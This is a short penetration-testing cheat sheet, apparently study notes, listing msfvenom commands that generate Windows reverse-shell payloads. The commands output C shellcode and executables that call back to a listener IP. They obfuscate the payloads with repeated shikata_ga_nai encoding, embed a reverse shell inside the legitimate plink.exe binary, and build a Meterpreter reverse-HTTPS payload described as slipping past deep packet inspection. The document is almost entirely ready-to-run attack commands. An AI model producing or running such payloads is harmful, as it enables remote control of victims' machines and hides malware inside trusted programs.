Payloads

Generate Shellcode with metasploit

root@kali:~# msfvenom -l payloads

root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Note:
	◦	LHOST = ip address of where the reverse shell will connect to
	◦	LPORT = Port of where the reverse shell will connect to
	◦	-f = format of code. Value c = the code will be formatted in C
	◦	-e = set encoder. value x86/shikata_ga_nai = encoder method
	◦	-b = bad characters to omit from the payload
	◦	EXITFUNC = setting the method that the shelllcode will take on exit. If a program is threaded then this value can be set to thread to avoid killing the whole service and thereby crashing it. 


Raw windows PE reverse: 

root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -o shell_reverse.exe


Encode the shellcode:


root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe


Inject a payload into an exisiting PE executable

root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe



Reverse HTTPS (Network Traffic looks exactly like normal HTTPS traffic, allowing bypassubg if deep packet inspection filters and encryption)

root@kali:~# msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe


